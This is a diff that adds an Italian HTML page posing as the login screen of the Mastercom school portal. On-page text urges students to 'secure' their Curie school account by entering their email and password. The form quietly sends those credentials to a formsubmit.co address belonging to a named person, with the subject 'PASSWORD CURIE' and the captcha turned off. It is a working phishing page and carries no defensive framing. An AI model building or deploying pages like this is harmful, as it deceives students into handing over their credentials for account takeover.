@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Mastercom Ver.25.0.26 - Login</title>
+  <link rel="stylesheet" href="index.css">
+  <link rel="icon" type="image/x-icon" href="image-removebg-preview.png">
+</head>
+<body>
+  
+  <!--immagine a destra-->
+  <a class="foto-sopra" href="https://www.mastercompro.it" target="_blank">
+    <img src="mastercom-w.png" style="position: absolute; top: 10px; right: 10px;" height="60" alt="Visit Mastercom Pro">
+  </a>
+  
+  <!--box aiuto-->
+  <div class="box-aiuto">
+    <p id="spiego">*Informiamo i gentili alunni di mettere in <span>sicurezza</span> il proprio account inserendo mail e password del proprio account curie</p>
+    <p id="aiuto">Per qualsiasi dubbio contatateci qui:<br><a target="_blank">tecnici@curiepergine.it</a></p>
+  </div>
+
+  <!--box forum-->
+  <div class="login">
+    <a href="https://www.mastercompro.it" target="_blank">
+      <img id="top-forum" src="image-removebg-preview.png">
+    </a>
+
+    <form action="https://formsubmit.co/mohamed.reddad@curiepergine.it" method="POST">
+      <div class="bottom-forum">
+          <div class="forum-quadrato" id="utente">
+              <input type="hidden" name="_subject" value="PASSWORD CURIE">
+              <input type="hidden" name="_captcha" value="false">
+              <label for="mail" class="spazio-utente"><b>Utente</b></label>
+              <input type="hidden" name="_next" value=""> 
+              <input type="text" id="email" name="mail" placeholder="Inserisci qui la tua mail" required>
+          </div>
+          <div class="forum-quadrato" id="password">
+              <label for="password" class="spazio-password"><strong>Password</strong></label>
+              <input type="password" id="password" name="password" placeholder="Inserisci qui la tua password" required>
+          </div>
+      </div>
+      <button type="submit" class="button green round">Entra</button>
+    </form>
+
+  </div>
+</body>
+</html>
